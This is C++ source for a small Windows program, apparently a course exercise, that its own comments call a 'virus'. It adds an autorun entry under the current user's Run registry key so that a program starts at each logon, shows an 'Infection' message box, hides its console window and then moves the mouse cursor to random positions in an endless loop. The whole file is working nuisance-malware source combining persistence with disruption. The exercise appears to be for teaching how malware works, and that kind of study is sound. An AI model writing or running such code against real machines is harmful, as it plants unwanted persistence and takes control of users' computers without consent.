// Week11RegVirus.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

using namespace std;


int main()
{
	HKEY RunKey;
	LPCTSTR valueP = TEXT("CO1508");
	LPCTSTR data = TEXT("C:\\WINDOWS\\system32\\mspaint.exe");

	//Prompt a message in case the virus cannot access the requisite files
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RUN"), &RunKey) !=ERROR_SUCCESS)
	{
		cout << "Unable to open registry key. Exit." << endl;
		return 0;
	}

	if (RegSetValueEx(RunKey, valueP, 0, REG_SZ, (LPBYTE)data, lstrlen(data) * sizeof(TCHAR)) != ERROR_SUCCESS)
	{
		RegCloseKey(RunKey);
		cout << "Unable to set the registry value. Exit." << endl;
		return 0;
	}
	else
	{
		RegCloseKey(RunKey);
		cout << "Registry value is succesfully set!\n";
		MessageBox(NULL, L"You just activated my trump card", L"Infection", MB_OKCANCEL);
	}

	//Move the cursor randomly
	while (1)
	{
		srand(time(NULL));
		HWND hwnd = GetConsoleWindow();
		POINT point;
		GetCursorPos(&point);
		ShowWindow(hwnd, SW_HIDE);
		for (int i = 0; i < 5000000; i++)
		{
			//set x and y coordinates of the cursor
			point.x = rand() % 2000;
			point.y = rand() % 2000;
		}
		SetCursorPos(point.x, point.y);
	}

    return 0;
}

